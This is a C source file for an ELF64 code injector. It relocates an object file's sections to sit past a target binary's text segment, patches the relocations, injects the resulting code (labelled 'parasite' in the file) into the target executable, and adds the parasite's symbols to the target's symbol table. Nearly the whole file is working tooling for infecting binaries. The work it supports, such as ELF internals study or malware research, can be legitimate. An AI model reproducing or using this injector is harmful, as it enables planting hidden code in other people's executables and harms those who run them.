
#include "headers.h"

int addsymbol(char *name, Elf64_Sym *sym, elf64_t *telf)
{
	Elf64_Off symoff, stroff, tmpoff;

	int fd, slen, strndx;
	size_t tmpsize, symsize, strstart;
	char *shstrtab, strtab;

	shstrtab = &telf->mem[telf->shdr[telf->ehdr->e_shstrndx].sh_offset];
	printf("Searching symbol table of target file...\n");
	symsize = sizeof(Elf64_Sym);
	symoff = 0;
	for (int i = 0; i < telf->ehdr->e_shnum; i++)
	{
		if (telf->shdr[i].sh_type == SHT_SYMTAB)
		{
			symoff = telf->shdr[i].sh_offset + telf->shdr[i].sh_size;
			tmpsize = telf->shdr[i].sh_size;
			telf->shdr[i].sh_size += symsize;
			strndx = telf->shdr[i].sh_link;
			printf("%s Symbol table offset: 0x%08lx\n", GREEN("[+]"), telf->shdr[i].sh_offset);
			printf("%s Symbol table address: 0x%08lx\n", GREEN("[+]"), telf->shdr[i].sh_addr);
			printf("%s Symbol table size: %ldBytes --> %ldBytes\n", GREEN("[+]"), tmpsize, telf->shdr[i].sh_size);
			printf("%s Symbol table linked string table index: %d\n", GREEN("[+]"), strndx);
			break;
		}
	}

	if (symoff == 0)
	{
		fprintf(stderr, "%s Symbol table not found\n", RED("[-]"));
		return -1;									// -->
	}

	printf("Adjusting sections offset after .symtab section of target file...\n");
	for (int i = 0; i < telf->ehdr->e_shnum; i++)
	{
		if (telf->shdr[i].sh_offset >= symoff)
		{
			tmpoff = telf->shdr[i].sh_offset;
			telf->shdr[i].sh_offset += symsize;
			printf("%s Section %s offset: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), \
				&shstrtab[telf->shdr[i].sh_name], tmpoff, telf->shdr[i].sh_offset);
		}
	}

	printf("Searching string table of target file...\n");
	slen = strlen(name);
	stroff = telf->shdr[strndx].sh_offset + telf->shdr[strndx].sh_size;
	if (telf->shdr[strndx].sh_offset >= symoff) stroff -= symsize;
	strstart = telf->shdr[strndx].sh_size;
	tmpsize = telf->shdr[strndx].sh_size;
	telf->shdr[strndx].sh_size += slen;
	sym->st_name = strstart;
	printf("%s String table offset: 0x%08lx\n", GREEN("[+]"), telf->shdr[strndx].sh_offset);
	printf("%s String table address: 0x%08lx\n", GREEN("[+]"), telf->shdr[strndx].sh_addr);
	printf("%s String table size: %ldBytes --> %ldBytes\n", GREEN("[+]"), tmpsize, telf->shdr[strndx].sh_size);

	printf("Adjusting the sections offset after .strtab section of target file...\n");
	for (int i = 0; i < telf->ehdr->e_shnum; i++)
	{
		if (telf->shdr[i].sh_offset >= stroff + symsize)
		{
			tmpoff = telf->shdr[i].sh_offset;
			telf->shdr[i].sh_offset += slen;
			printf("%s Section %s offset: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), \
				&shstrtab[telf->shdr[i].sh_name], tmpoff, telf->shdr[i].sh_offset);
		}
	}

	printf("Adjusting the section header offset of target file...\n");
	tmpoff = telf->ehdr->e_shoff;
	telf->ehdr->e_shoff += (symsize + slen);
	printf("%s Section header: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), tmpoff, telf->ehdr->e_shoff);

	if ((fd = open(TMP_FILE, O_CREAT | O_WRONLY, telf->mode)) < 0)
	{
		fprintf(stderr, "%s Open file %s failed\n", RED("[-]"), TMP_FILE);
		return -1;									// -->
	}

	printf("Adding symbol %s to target file...\n", name);

	if (write(fd, telf->mem, symoff) != symoff)
	{
		perror("telf->mem");
		return -1;									// -->
	}

	if (write(fd, sym, symsize) != symsize)
	{
		perror("sym");
		return -1;									// -->
	}

	if (write(fd, telf->mem + symoff, stroff - symoff) != stroff - symoff)
	{
		perror("telf->mem + symoff");
		return -1;									// -->
	}

	if (write(fd, name, slen) != slen)
	{
		perror("name");
		return -1;									// -->
	}

	if (write(fd, telf->mem + stroff, telf->size - stroff) != telf->size - stroff)
	{
		perror("telf->mem + stroff");
		return -1;									// -->
	}

	if (fsync(fd) < 0)
	{
		fprintf(stderr, "[-] Fsync file %s failed\n", TMP_FILE);
		return -1;									// -->
	}

	printf("%s Symbol %s, value 0x%08lx: 0x%08lx\n", GREEN("[+]"), name, sym->st_value, symoff);

	unload_elf(telf);
	unlink(telf->path);
	rename(TMP_FILE, telf->path);
	load_elf(telf->path, telf);

	return 0;
}

int relocate_elf(char *tfile, char *pfile)
{
	elf64_t telf, pelf;
	Elf64_Addr tmpaddr;
	Elf64_Rela *rela;
	Elf64_Shdr *relasec, *symsec;
	Elf64_Sym *symtab, *symbol;
	Elf64_Addr paddr;
	Elf32_Addr relavaddr, symval, *rlocation;
	Elf64_Off symoff;

	size_t psize;
	uint8_t *pcode;
	char *shstrtab, *strtab;

	if (load_elf(tfile, &telf) == -1)
	{
		fprintf(stderr, "%s Load file %s failed\n", RED("[-]"), tfile);
		return -1;									// -->
	}

	if (load_elf(pfile, &pelf) == -1)
	{
		fprintf(stderr, "%s Load file %s failed\n", RED("[-]"), pfile);
		return -1;									// -->
	}

	shstrtab = &pelf.mem[pelf.shdr[pelf.ehdr->e_shstrndx].sh_offset];
	printf("Searching text segment of target file...\n");
	paddr = 0;
	for (int i = 0; i < telf.ehdr->e_phnum; i++)
	{
		if (telf.phdr[i].p_type == PT_LOAD && !telf.phdr[i].p_offset)
		{
			paddr = telf.phdr[i].p_vaddr + telf.phdr[i].p_memsz;
			printf("%s Parasite address: 0x%08lx\n", GREEN("[+]"), paddr);
		}
	}

	if (paddr == 0)
	{
		fprintf(stderr, "%s Text segment not found\n", RED("[-]"));
		return -1;									// -->
	}

	/* Adjust the object file sections that type is SHT_PROGBITS */
	printf("Adjusting the sections address of object file...\n");
	psize = 0;
	for (int i = 0; i < pelf.ehdr->e_shnum; i++)
	{
		if (pelf.shdr[i].sh_type == SHT_PROGBITS)
		{
			tmpaddr = pelf.shdr[i].sh_addr;
			pelf.shdr[i].sh_addr += (paddr + psize);
			psize += pelf.shdr[i].sh_size;
			printf("%s Section %s address: 0x%08lx --> 0x%08lx\n", GREEN("[+]"), \
				&shstrtab[pelf.shdr[i].sh_name], tmpaddr, pelf.shdr[i].sh_addr);
		}
		else if (pelf.shdr[i].sh_type == SHT_STRTAB && i != pelf.ehdr->e_shstrndx)
			strtab = &pelf.mem[pelf.shdr[i].sh_offset];
	}

	printf("Relocating object file...\n");
	for (int i = 0; i < pelf.ehdr->e_shnum; i++)
	{
		if (pelf.shdr[i].sh_type == SHT_RELA)
		{
			symoff = pelf.shdr[pelf.shdr[i].sh_link].sh_offset;
			symtab = (Elf64_Sym *)&pelf.mem[symoff];
			rela = (Elf64_Rela *)&pelf.mem[pelf.shdr[i].sh_offset];
			relasec = &pelf.shdr[pelf.shdr[i].sh_info];
			printf("%s Relocation linked section: %s\n", GREEN("[+]"), &shstrtab[relasec->sh_name]);
			for (int j = 0; j < pelf.shdr[i].sh_size / sizeof(Elf64_Rela); j++, rela++)
			{
				/* Get associated symbol */
				symbol = &symtab[ELF64_R_SYM(rela->r_info)];
				symsec = &pelf.shdr[symbol->st_shndx];
				/* Get symbol value: S */
				symval = symsec->sh_addr + symbol->st_value;
				/* Get target address: P */
				relavaddr = relasec->sh_addr + rela->r_offset;
				/* Get location of relocation in file */
				rlocation = (Elf32_Addr *)&pelf.mem[relasec->sh_offset + rela->r_offset];

				printf("%s Symbol linked section %s\n", GREEN("[+]"), &shstrtab[symsec->sh_name]);
				printf("%s Position of relocation (P): 0x%08x\n", GREEN("[+]"), relavaddr);
				printf("%s Symbol value (S): 0x%08x\n", GREEN("[+]"), symval);

				switch(ELF64_R_TYPE(rela->r_info))
				{
				/* R_X86_64_PC32: S + A - P */
				case R_X86_64_PC32:
					*rlocation += symval;
					*rlocation += rela->r_addend;
					*rlocation -= relavaddr;
					break;
				/* R_X86_64_32: S + A */
				case R_X86_64_32:
					*rlocation += symval;
					*rlocation += rela->r_addend;
					break;
				}
			}
		}
	}

	printf("%s Parasite size: %ld Bytes\n", GREEN("[+]"), psize);
	if (!(pcode = (uint8_t *)malloc(psize)))
	{
		fprintf(stderr, "%s Malloc parasite code failed\n", RED("[-]"));
		return -1;									// -->
	}

	printf("Extacting object code from object file...\n");
	psize = 0;
	for (int i = 0; i < pelf.ehdr->e_shnum; i++)
	{
		if (pelf.shdr[i].sh_type == SHT_PROGBITS)
		{
			memcpy(pcode + psize, &pelf.mem[pelf.shdr[i].sh_offset], pelf.shdr[i].sh_size);
			printf("%s Section %s: %ldBytes --> Object code\n", GREEN("[+]"), \
				&shstrtab[pelf.shdr[i].sh_name], pelf.shdr[i].sh_size);
			psize += pelf.shdr[i].sh_size;
		}
	}

	if (inject_elf(&telf, pcode, psize) == -1)
	{
		fprintf(stderr, "%s Inject file %s failed\n", RED("[-]"), tfile);
		return -1;									// -->
	}

	for (int i = 0; i < pelf.ehdr->e_shnum; i++)
	{
		if (pelf.shdr[i].sh_type == SHT_SYMTAB)
		{
			strtab = &pelf.mem[pelf.shdr[pelf.shdr[i].sh_link].sh_offset];
			symbol = (Elf64_Sym *)&pelf.mem[pelf.shdr[i].sh_offset];
			for (int j = 0; j < pelf.shdr[i].sh_size / sizeof(Elf64_Sym); j++, symbol++)
			{
				if (ELF64_ST_TYPE(symbol->st_info) == STT_FUNC || \
					ELF64_ST_TYPE(symbol->st_info) == STT_OBJECT)
				{
					symsec = &pelf.shdr[symbol->st_shndx];
					symbol->st_value += symsec->sh_addr;
					if (addsymbol(&strtab[symbol->st_name], symbol, &telf) == -1)
						return -1;					// -->
				}
			}
			break;
		}
	}

	free(pcode);
	unload_elf(&telf);
	unload_elf(&pelf);

	return 0;
}

int main(int argc, char *argv[])
{
	if (argc != 3)
	{
		printf("Usage: %s <target file> <object file>\n", argv[0]);
		exit(-1);									// -->
	}

	if (relocate_elf(argv[1], argv[2]) == -1)
	{
		fprintf(stderr, "%s Relocate file %s failed\n", RED("[-]"), argv[2]);
		exit(-1);									// -->
	}

	return 0;
}
